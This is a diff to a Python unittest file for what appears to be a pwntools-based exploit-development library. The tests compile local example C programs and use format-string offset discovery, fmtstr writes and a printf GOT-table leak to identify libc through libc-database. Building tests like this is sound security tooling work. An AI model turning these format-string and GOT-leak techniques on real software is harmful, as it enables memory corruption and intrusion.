@@ -9,18 +9,21 @@ class BinTests(ut.TestCase):
         assert path.isfile('/usr/bin/gcc')
     
     def test_printf_buffer_bruteforce(self):
+        print()
         try:
             system('./examples/1.c')    # compile the program
-            context.log_level = 'WARN'
+            context.log_level = 'warn'
             context.binary = '1.out'
             
+            @context.quiet
             def printf(l: str): # First, a function to abstract C printf() i/o
                 r = context.binary.process()
                 r.sendafter('\n', l)
                 return r.recvline()
             
-            # Let's say we want to write to s[56]. We first find the printf() offset to s[]:
-            offset = fsb.find_offset.buffer(printf)
+            # Let's say we want to write to s[64]. We first find the printf() offset to s[]:
+            with attrib_set_to(context, 'log_level', 'info') as _:  # show info for testing purposes
+                offset = fsb.find_offset.buffer(printf, maxlen=49)  # maxlen is 50-1 (-1 due to fgets)
             
             # Then, make use of pwntools' fmtstr library to write to there:
             r = context.binary.process()
@@ -37,19 +40,22 @@ class BinTests(ut.TestCase):
             system('rm 1.out')
         
     def test_libc_db(self):
+        print()
         try:
             system('./examples/2.c')    # compile the program
-            context.log_level = 'info'
+            context.log_level = 'warn'
             context.binary = '2.out'
             proc = {'argv':['./2.out'], 'env':{"LD_PRELOAD": "examples/ld-2.27.so examples/libc.so.6"}}
             GOT_table = ['__libc_start_main', 'printf', 'fgets']
             GOT_addrs = list(map(lambda s: context.binary.got[s], GOT_table))
             
+            @context.quiet
             def printf(l:str):
                 r = process(**proc)
                 r.send(l)
                 return r.recvline()
-            buf_off = fsb.find_offset.buffer(printf)
+            with attrib_set_to(context, 'log_level', 'info') as _:  # show info for testing purposes
+                buf_off = fsb.find_offset.buffer(printf)
 
             # send a printf GOT table leak exploit
             r = process(**proc)
@@ -62,7 +68,8 @@ class BinTests(ut.TestCase):
             libc_dict = dict(zip(GOT_table, libc_addrs))
             path_to_libcdb = input("path to libc-database: ").strip()
             assert path.isdir(path_to_libcdb)
-            db = libc_find(path_to_libcdb, libc_dict)
+            with attrib_set_to(context, 'log_level', 'info') as _:  # show info for testing purposes
+                db = libc_find(path_to_libcdb, libc_dict)
 
             # test the libc id found
             r = process(**proc)
